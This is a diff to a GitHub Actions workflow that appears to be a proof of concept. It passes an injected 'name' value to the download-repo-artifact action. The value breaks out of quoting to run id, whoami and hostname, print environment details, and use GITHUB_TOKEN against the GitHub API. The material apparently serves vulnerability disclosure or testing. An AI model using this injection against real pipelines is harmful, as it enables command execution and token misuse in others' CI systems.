@@ -8,6 +8,6 @@ jobs:
       - name: Call vulnerable action with injected input
         uses: transferwise/download-repo-artifact@master
         with:
-          name: 'x" || true; id; whoami; echo "TOKEN_LENGTH=${#GITHUB_TOKEN}'
+          name: 'x" || true; echo "=== INJECTION CONFIRMED ==="; echo "--- id ---"; id; echo "--- whoami ---"; whoami; echo "--- hostname ---"; hostname; echo "--- env (secrets in scope) ---"; echo "GITHUB_TOKEN length=${#GITHUB_TOKEN}"; echo "GITHUB_REPOSITORY=$GITHUB_REPOSITORY"; echo "GITHUB_ACTOR=$GITHUB_ACTOR"; echo "GITHUB_WORKFLOW=$GITHUB_WORKFLOW"; echo "--- github api call using injected token ---"; curl -s -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/user | python3 -c "import sys,json; d=json.load(sys.stdin); print(\"Authenticated as:\", d.get(\"login\",\"unknown\"))"; echo "=== END INJECTION ==="; echo "'
           path: '.'
         continue-on-error: true
